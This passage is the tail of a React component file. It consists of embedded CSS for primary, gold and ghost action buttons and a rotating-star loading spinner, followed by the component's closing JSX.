        .action-btn-primary:hover:not(:disabled) { box-shadow: 0 8px 28px rgba(109,40,217,0.55); }

        .action-btn-gold {
          background: linear-gradient(135deg,#f59e0b,#d97706);
          color: #1e1a0e;
          box-shadow: 0 6px 20px rgba(245,158,11,0.35);
        }
        .action-btn-gold:hover:not(:disabled) { box-shadow: 0 8px 28px rgba(245,158,11,0.5); }

        .action-btn-ghost {
          background: rgba(255,255,255,0.05);
          border: 1px solid rgba(255,255,255,0.1);
          color: #94a3b8;
          backdrop-filter: blur(8px);
        }
        .action-btn-ghost:hover:not(:disabled) { background: rgba(255,255,255,0.09); color: #cbd5e1; }

        /* ── loading spinner ── */
        .spin-star { display: inline-block; color: #f59e0b; animation: spinStar 1.2s ease-in-out infinite; }
        @keyframes spinStar { 0%{transform:rotate(0) scale(1)} 50%{transform:rotate(180deg) scale(1.2)} 100%{transform:rotate(360deg) scale(1)} }
      `}</style>
    </div>
  );
}
